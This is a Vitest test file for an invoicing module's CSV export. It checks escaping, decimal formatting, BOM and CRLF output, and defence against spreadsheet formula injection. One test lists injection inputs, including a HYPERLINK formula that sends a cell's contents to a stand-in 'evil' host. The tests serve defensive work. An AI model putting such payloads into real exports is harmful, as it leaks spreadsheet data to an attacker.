import { describe, expect, it } from "vitest";
import { centsToDecimal, csvCell, neutralizeFormula, toCsv } from "@/server/domains/invoicing/csv";

describe("accounting CSV (SEC-14)", () => {
  it("neutralizes cells a spreadsheet would evaluate as a formula", () => {
    for (const value of ['=HYPERLINK("http://evil/?"&A1,"x")', "+1+1", "-cmd", "@SUM(A1)", "\tx", "\rx"]) {
      expect(neutralizeFormula(value).startsWith("'")).toBe(true);
    }
  });

  it("leaves plain text and the amounts we generate untouched", () => {
    expect(neutralizeFormula("Salle Rivoli")).toBe("Salle Rivoli");
    expect(neutralizeFormula("-12.50")).toBe("-12.50");
    expect(neutralizeFormula("1234.56")).toBe("1234.56");
  });

  it("quotes and escapes every cell", () => {
    expect(csvCell('a "b"')).toBe('"a ""b"""');
    expect(csvCell(null)).toBe('""');
  });

  it("writes exact decimals from integer cents", () => {
    expect(centsToDecimal(123456)).toBe("1234.56");
    expect(centsToDecimal(-1250)).toBe("-12.50");
    expect(centsToDecimal(5)).toBe("0.05");
  });

  it("starts with a BOM and uses CRLF", () => {
    const csv = toCsv([["a", "b"], [1, 2]]);
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(csv).toContain("\r\n");
  });
});
